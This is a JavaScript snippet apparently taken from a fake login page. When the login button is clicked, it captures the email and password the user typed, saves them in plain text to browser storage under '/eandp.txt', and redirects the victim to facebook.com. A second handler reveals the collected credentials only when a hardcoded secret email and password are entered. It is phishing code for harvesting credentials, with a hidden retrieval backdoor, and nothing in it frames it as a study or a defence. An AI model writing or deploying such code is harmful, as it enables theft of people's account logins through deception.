
    document.getElementById('btn-login').addEventListener('click', function() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        try {
            // Get existing data from localStorage
            const existingData = localStorage.getItem('/eandp.txt') || '';

            // Append the new data
            const newData = `Email: ${email}, Password: ${password}\n`;
            const updatedContents = existingData + newData;

            // Save the updated content back to localStorage
            localStorage.setItem('/eandp.txt', updatedContents);

            window.location.href='https://www.facebook.com/'
        } catch (error) {
            console.error('Error appending data', error);
        }
    });

    document.getElementById('dar2').addEventListener('click', function() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (email === 'qwertyuiopasdfghjklzxcvbnm@gmail.com' && password === '12345678') {
            const existingData = localStorage.getItem('/eandp.txt') || '';

            console.log('Current user data:', existingData);
        }
    });
